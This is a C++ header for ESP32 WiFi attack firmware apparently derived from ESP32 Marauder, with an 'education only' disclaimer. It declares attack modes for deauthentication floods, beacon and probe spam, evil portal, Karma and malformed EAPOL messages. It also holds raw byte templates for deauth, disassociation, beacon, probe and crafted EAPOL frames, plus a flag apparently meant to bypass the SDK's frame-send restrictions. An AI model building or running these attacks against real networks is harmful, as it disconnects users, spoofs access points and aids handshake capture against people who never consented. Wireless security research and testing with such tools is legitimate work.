#pragma once

#ifndef WIFIHEADER_H
#define WIFIHEADER_H

/*
    * wifiheader.h (Based ESP32 Marauder By @justcallmekoko)
    * /!\ WARNING: All Code I Wrote In This Is For Education Purpose ONLY! /!\
    * /!\        I NOT RESPONSIBLE ANY DAMAGE USER CAUSE IN PUBLIC         /!\
    * Author: Shine Nagumo @Ohminecraft (Xun Anh Nguyen)
    * Licensed under the MIT License.
*/

#include <Arduino.h>
#include <WiFi.h>
#include "esp_wifi.h"
#include "esp_wifi_types.h"

#include <LinkedList.h>

#include "core/utilsheader.h"
#include "core/displayheader.h"
#include "core/clockheader.h"
#include "core/logutilsheader.h"

extern LogUtils logutils;

enum WiFiScanState {
    WIFI_SCAN_OFF,
    WIFI_SCAN_AP,
    WIFI_SCAN_AP_OLD,
    WIFI_SCAN_AP_STA,
    WIFI_SCAN_PROBE_REQ,
    WIFI_SCAN_DEAUTH,
    WIFI_SCAN_BEACON,
    WIFI_SCAN_EAPOL,
    WIFI_SCAN_EAPOL_DEAUTH,
    WIFI_SCAN_CH_ANALYZER,
    WIFI_ATTACK_RND_BEACON,
    WIFI_ATTACK_STA_BEACON, // ATTACK STABLE SSID
    WIFI_ATTACK_RIC_BEACON,
    WIFI_ATTACK_AP_BEACON,
    WIFI_ATTACK_DEAUTH,
    WIFI_ATTACK_STA_DEAUTH,
    WIFI_ATTACK_DEAUTH_FLOOD,
    WIFI_ATTACK_AUTH,// ATTACK PROBE
    WIFI_ATTACK_EVIL_PORTAL,
    WIFI_ATTACK_EVIL_PORTAL_DEAUTH,
    WIFI_ATTACK_KARMA,
    WIFI_ATTACK_BAD_MSG,
    WIFI_ATTACK_BAD_MSG_ALL
};

#define WIFI_SECURITY_OPEN   0
#define WIFI_SECURITY_WEP    1
#define WIFI_SECURITY_WPA    2
#define WIFI_SECURITY_WPA2   3
#define WIFI_SECURITY_WPA3   4
#define WIFI_SECURITY_WPA_WPA2_MIXED 5
#define WIFI_SECURITY_WPA2_ENTERPRISE 6
#define WIFI_SECURITY_WPA3_ENTERPRISE 7
#define WIFI_SECURITY_WAPI 8
#define WIFI_SECURITY_UNKNOWN 255

#define MAX_AP_NAME_SIZE 32
#define MAX_HTML_SIZE 11400

/*
struct SSID {
    String essid;
    uint8_t channel;
    uint8_t bssid[6];
    bool wpa2;
    bool selected;
};
*/

enum WiFiBand {
    WIFI_BAND_2_4G,
    WIFI_BAND_5G
};

struct AccessPoint {
    String essid;
    uint8_t channel;
    uint8_t bssid[6];
    uint8_t wpa;
    String wpastr;
    bool selected;
    LinkedList<uint16_t>* stations;
    char beacon[2];
    WiFiBand band;
    int8_t rssi;
};

struct Station {
    uint8_t mac[6];
    bool selected;
    uint16_t ap;
};

struct ProbeReqSsid {
    String essid;
    bool selected;
    uint8_t requests;
    uint8_t channel;
    int8_t rssi;
};

extern LinkedList<AccessPoint>* access_points;
extern LinkedList<AccessPoint>* deauth_flood_ap;
extern LinkedList<Station>* device_station;
extern LinkedList<ProbeReqSsid>* probe_req_ssids;

extern bool wifiScanRedraw;

esp_err_t esp_wifi_80211_tx(wifi_interface_t ifx, const void *buffer, int len, bool en_sys_seq);

class WiFiModules
{
    private:
        uint32_t initTime = 0;
        uint8_t channel_hop_delay = 1;

        // ESP32 Marauder
        uint8_t beacon_frame_packet[128] = {
            /* 0 - 3 */    0x80, 0x00, 0x00, 0x00, //Frame Control, Duration
            /* 4 - 9 */    0xff, 0xff, 0xff, 0xff, 0xff, 0xff, //Destination address 
            /* 10 - 15 */  0x01, 0x02, 0x03, 0x04, 0x05, 0x06, //Source address - overwritten later
            /* 16 - 21 */  0x01, 0x02, 0x03, 0x04, 0x05, 0x06, //BSSID - overwritten to the same as the source address
            /* 22 - 23 */  0xc0, 0x6c, //Seq-ctl
            /* 24 - 31 */  0x83, 0x51, 0xf7, 0x8f, 0x0f, 0x00, 0x00, 0x00, //timestamp - the number of microseconds the AP has been active
            /* 32 - 33 */  0x64, 0x00, //Beacon interval
            /* 34 - 35 */  0x01, 0x04, //Capability info
            /* SSID */
            /*36*/  0x00
            };

        uint8_t probe_frame_packet[68] = {
            /*  0 - 1  */ 0x40, 0x00,                                                                   // Type: Probe Request
            /*  2 - 3  */ 0x00, 0x00,                                                                   // Duration: 0 microseconds
            /*  4 - 9  */ 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, // Destination: Broadcast
            /* 10 - 15 */ 0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA, // Source: random MAC
            /* 16 - 21 */ 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, // BSS Id: Broadcast
            /* 22 - 23 */ 0x00, 0x00,                                                                   // Sequence number (will be replaced by the SDK)
            /* 24 - 25 */ 0x00, 0x20,                                                                   // Tag: Set SSID length, Tag length: 32
            /* 26 - 57 */ 0x20, 0x20,               0x20,               0x20,                           // SSID
            0x20,               0x20,               0x20,               0x20,
            0x20,               0x20,               0x20,               0x20,
            0x20,               0x20,               0x20,               0x20,
            0x20,               0x20,               0x20,               0x20,
            0x20,               0x20,               0x20,               0x20,
            0x20,               0x20,               0x20,               0x20,
            0x20,               0x20,               0x20,               0x20,
            /* 58 - 59 */ 0x01, 0x08, // Tag Number: Supported Rates (1), Tag length: 8
            /* 60 */ 0x82,            // 1(B)
            /* 61 */ 0x84,            // 2(B)
            /* 62 */ 0x8b,            // 5.5(B)
            /* 63 */ 0x96,            // 11(B)
            /* 64 */ 0x24,            // 18
            /* 65 */ 0x30,            // 24
            /* 66 */ 0x48,            // 36
            /* 67 */ 0x6c             // 54
        };

        uint8_t eapol_packet_bad_msg1[153] = {
            0x08, 0x02,                         // Frame Control (EAPOL)
            0x00, 0x00,                         // Duration
            0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, // Destination (Broadcast)
            0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // Source (BSSID)
            0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // BSSID
            0x00, 0x00,                         // Sequence Control
            /* LLC / SNAP */
            0xaa, 0xaa, 0x03, 0x00, 0x00, 0x00,
            0x88, 0x8e,                          // Ethertype = EAPOL
            /* -------- 802.1X Header -------- */
            0x02,                               // Version 802.1X‑2004
            0x03,                               // Type Key
            0x00, 0x75,                          // Length 117 bytes
            /* -------- EAPOL‑Key frame body (117 B) -------- */
            0x02,                               // Desc Type 2 (AES/CCMP)
            0x00, 0xCA,                          // Key Info (Install|Ack…)
            0x00, 0x10,                          // Key Length = 16
            /* Replay Counter (8) */
            0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x01,
            /* Nonce (32) */
            0x00, 0x01, 0x02, 0x03, 0x04, 0x05, 0x06, 0x07,
            0x08, 0x09, 0x0a, 0x0b, 0x0c, 0x0d, 0x0e, 0x0f,
            0x10, 0x11, 0x12, 0x13, 0x14, 0x15, 0x16, 0x17,
            0x18, 0x19, 0x1a, 0x1b, 0x1c, 0x1d, 0x1e, 0x1f,
            /* Key IV (16) */
            0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
            0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
            /* Key RSC (8) */
            0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
            /* Key ID  (8) */ 
            0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
            /* Key MIC (16) */ 
            0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
            0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
            /* Key Data Len (2) */ 
            0x00, 0x16,
            /* Key Data (22 B) */
            0xDD, 0x16,                // Vendor‑specific (PMKID IE)
            0x00, 0x0F, 0xAC, 0x04,      // OUI + Type (PMKID)
            /* PMKID (16 byte zero) */
            0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
            0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00
        };


        typedef struct
        {
        int16_t fctl;
        int16_t duration;
        uint8_t da;
        uint8_t sa;
        uint8_t bssid;
        int16_t seqctl;
        unsigned char payload[];
        } __attribute__((packed)) WifiMgmtHdr;
        
        typedef struct {
        uint8_t payload[0];
        WifiMgmtHdr hdr;
        } wifi_ieee80211_packet_t;


        const wifi_promiscuous_filter_t filt = {.filter_mask=WIFI_PROMIS_FILTER_MASK_MGMT | WIFI_PROMIS_FILTER_MASK_DATA};

        const char* rick_roll[8] = {
            "Never gonna give you up",
            "Never gonna let you down",
            "Never gonna run around",
            "and desert you",
            "Never gonna make you cry",
            "Never gonna say goodbye",
            "Never gonna tell a lie",
            "and hurt you"};
        
        const char* stable_ssid_beacon[50] = {
            "Mom Use This One",
            "Abraham Linksys",
            "Benjamin FrankLAN",
            "Martin Router King",
            "John Wilkes Bluetooth",
            "Pretty Fly for a Wi-Fi",
            "Bill Wi the Science Fi",
            "I Believe Wi Can Fi",
            "Tell My Wi-Fi Love Her",
            "No More Mister Wi-Fi",
            "LAN Solo",
            "The LAN Before Time",
            "Silence of the LANs",
            "House LANister",
            "Winternet Is Coming",
            "Ping's Landing",
            "The Ping in the North",
            "This LAN Is My LAN",
            "Get Off My LAN",
            "The Promised LAN",
            "The LAN Down Under",
            "FBI Surveillance Van 4",
            "Area 51 Test Site",
            "Drive-By Wi-Fi",
            "Planet Express",
            "Wu Tang LAN",
            "Darude LANstorm",
            "Never Gonna Give You Up",
            "Hide Yo Kids, Hide Yo Wi-Fi",
            "Loading…",
            "Searching…",
            "VIRUS.EXE",
            "Virus-Infected Wi-Fi",
            "Starbucks Wi-Fi",
            "Text 64ALL for Password",
            "Yell BRUCE for Password",
            "The Password Is 1234",
            "Free Public Wi-Fi",
            "No Free Wi-Fi Here",
            "Get Your Own Damn Wi-Fi",
            "It Hurts When IP",
            "Dora the Internet Explorer",
            "404 Wi-Fi Unavailable",
            "Porque-Fi",
            "Titanic Syncing",
            "Test Wi-Fi Please Ignore",
            "Drop It Like It's Hotspot",
            "Life in the Fast LAN",
            "The Creep Next Door",
            "Ye Olde Internet"
        };

        bool wsl_bypass_enable = false;

        uint8_t getSecurityType(const uint8_t* beacon, uint16_t len);
        void StartAPStaWiFiScan();
        void StartAPWiFiScan();
        void StartAPWiFiScanOld();
        void StartProbeReqScan();
        void StartBeaconScan();
        void StartDeauthScan();
        void StartEapolScan();
        void StartAnalyzerScan();
        void StartWiFiAttack(WiFiScanState attack_mode);

        void sendCustomBeacon(AccessPoint custom_ssid);
        void sendCustomESSIDBeacon(const char* ESSID);
        void sendBeaconRandomSSID();
        void sendDeauthAttack();
        void sendDeauthFrame(uint8_t bssid[6], int channel, uint8_t sta_mac[6]);
        void sendProbeAttack();
        void sendEapolBagMsg(uint8_t bssid[6], int channel, uint8_t mac[6], uint8_t sec = WIFI_SECURITY_WPA2);

    public:

        ~WiFiModules() {
            setMac();
            ShutdownWiFi();
        }


        uint8_t ap_mac[6] = {0xDE, 0xAD, 0xBE, 0xEF, 0xFE, 0xED};
        uint8_t sta_mac[6] = {0xDE, 0xAD, 0xBE, 0xEF, 0xFE, 0xED};
        uint32_t packet_sent = 0;
        uint8_t set_channel = 1;
        int16_t wifi_analyzer_frames[SCR_WIDTH];
        uint8_t wifi_analyzer_frames_recvd = 0;
        int16_t wifi_analyzer_value = 0;
        int8_t wifi_analyzer_rssi = 0;
        String wifi_analyzer_ssid = "";

        bool deauth_flood_redraw = false;
        bool deauth_flood_found_ap = false;
        bool deauth_flood_scan_one_shot = false;
        String deauth_flood_target = "";

        bool dualBandInList = false;
        
        wifi_config_t ap_config;
        wifi_init_config_t cfg = WIFI_INIT_CONFIG_DEFAULT();
    
        wifi_init_config_t cfg2 = { \
            .event_handler = &esp_event_send_internal, \
            .osi_funcs = &g_wifi_osi_funcs, \
            .wpa_crypto_funcs = g_wifi_default_wpa_crypto_funcs, \
            .static_rx_buf_num = 6,\
            .dynamic_rx_buf_num = 6,\
            .tx_buf_type = 0,\
            .static_tx_buf_num = 1,\
            .dynamic_tx_buf_num = WIFI_DYNAMIC_TX_BUFFER_NUM,\
            .cache_tx_buf_num = 0,\
            .csi_enable = false,\
            .ampdu_rx_enable = false,\
            .ampdu_tx_enable = false,\
            .amsdu_tx_enable = false,\
            .nvs_enable = false,\
            .nano_enable = WIFI_NANO_FORMAT_ENABLED,\
            .rx_ba_win = 6,\
            .wifi_task_core_id = WIFI_TASK_CORE_ID,\
            .beacon_max_len = 752, \
            .mgmt_sbuf_num = 8, \
            .feature_caps = g_wifi_feature_caps, \
            .sta_disconnected_pm = WIFI_STA_DISCONNECTED_PM_ENABLED,  \
            .espnow_max_encrypt_num = 0, \
            .magic = WIFI_INIT_CONFIG_MAGIC\
        };

        uint8_t deauth_frame_packet[26] = { // Should be in public because evil portal needs it
            /*  0 - 1  */ 0xC0, 0x00,                         // type, subtype c0: deauth (a0: disassociate)
            /*  2 - 3  */ 0x3A, 0x01,                         // duration (SDK takes care of that)
            /*  4 - 9  */ 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, // reciever (target)
            /* 10 - 15 */ 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, // source (ap)
            /* 16 - 21 */ 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, // BSSID (ap)
            /* 22 - 23 */ 0x00, 0x00,                         // fragment & squence number
            /* 24 - 25 */ 0x01, 0x00                          // reason code (1 = unspecified reason)
        };

        // https://github.com/jaylikesbunda/Ghost_ESP/blob/v1.7/main/managers/wifi_manager.c
        uint8_t disassoc_frame_packet[26] = {
            0xa0, 0x00,                         // Frame Control (only first byte different)
            0x3a, 0x01,                         // Duration
            0xff, 0xff, 0xff, 0xff, 0xff, 0xff, // Destination addr
            0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // Source addr
            0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // BSSID
            0x00, 0x00,                         // Sequence number
            0x07, 0x00                          // Reason code
        };

        void setMac();
        void changeChannel();
        void channelHop();
        void channelRandom();
        void main();
        bool ShutdownWiFi();

        void StartMode(WiFiScanState mode);
        void mainAttackLoop(WiFiScanState mode);
        void StartDeauthFlood();
        // https://github.com/justcallmekoko/ESP32Marauder/blob/master/esp32_marauder/WiFiScan.h
        static void apSnifferCallback(void* buf, wifi_promiscuous_pkt_type_t type);
        static void apstaSnifferCallback(void* buf, wifi_promiscuous_pkt_type_t type);
        static void probeSnifferCallback(void* buf, wifi_promiscuous_pkt_type_t type);
        static void beaconSnifferCallback(void* buf, wifi_promiscuous_pkt_type_t type);
        static void deauthSnifferCallback(void* buf, wifi_promiscuous_pkt_type_t type);
        static void eapolSnifferCallback(void* buf, wifi_promiscuous_pkt_type_t type);
        static void analyzerWiFiSnifferCallback(void* buf, wifi_promiscuous_pkt_type_t type);

};

#endif // WIFIHEADER_H